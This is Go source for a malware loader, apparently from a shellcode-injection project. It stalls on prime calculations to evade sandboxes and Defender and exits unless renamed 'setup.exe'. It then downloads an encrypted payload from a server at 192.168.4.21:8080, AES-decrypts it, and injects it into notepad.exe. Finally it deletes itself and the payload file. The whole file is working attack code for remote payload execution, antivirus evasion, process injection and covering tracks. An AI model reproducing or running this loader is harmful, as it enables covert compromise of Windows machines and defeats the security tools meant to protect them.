package main

import (
	"fmt"
	"github.com/jonathankirtland/APCGO/pkg/encryption"
	"github.com/jonathankirtland/APCGO/pkg/injection"
	selfdelete "github.com/jonathankirtland/APCGO/pkg/self_delete"
	"github.com/jonathankirtland/APCGO/pkg/stalling"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
)

func downloadFile(filepath string, url string) (err error) {

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("bad status: %s", resp.Status)
	}

	// Writer the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
func main() {

	limit := 19000000 // Find primes up to this number
	filename := filepath.Base(os.Args[0])
	//println(filename)

	if filename != "setup.exe" {
		//selfdelete.SelfDeleteExe()
		stalling.CalculatePrimes(limit * 2)
		os.Exit(0)
	}

	//curl the file from our server on 192.168.4.21:8080/payload.bin
	fileURL := "http://192.168.4.21:8080/payload.bin"
	downloadFile("C:\\Users\\Public\\payload.bin", fileURL)
	key, iv, payload, _ := stalling.ReadFileAndExtractComponents("C:\\Users\\Public\\payload.bin")

	//valueString := encryption.BytesToHexArray(payload)
	//ivString := encryption.BytesToHexArray(iv)
	//keystring := encryption.BytesToHexArray(key)

	//println(valueString)
	//println(ivString)
	//println(keystring)

	//fmt.Sscanln("Press enter to continue...")
	//fmt.Println("Calculating prime numbers...")
	//start := time.Now()
	stalling.CalculatePrimes(limit)
	//duration := time.Since(start)
	//fmt.Println("Calculation completed.")
	//fmt.Printf("Time elapsed: %s\n", duration)

	plaintext, err := encryption.DecryptAES(key, iv, payload)

	if err != nil {
		log.Fatal(err)
	}

	//TOTAL_BYTES - ADDED BYTES
	plaintext = plaintext[:len(plaintext)-int(plaintext[len(plaintext)-1])]

	//defender check

	stalling.CalculatePrimes(limit / 2)
	_, err = injection.Inject(true, true, "C:\\WINDOWS\\system32\\notepad.exe", "", plaintext)

	if err != nil {
		log.Fatal(err)
	}

	err = selfdelete.SelfDeleteExe()
	if err != nil {
		return
	}
	//delete payload.bin
	err = os.Remove("C:\\Users\\Public\\payload.bin")
	if err != nil {
		return
	}

	os.Exit(0)

}
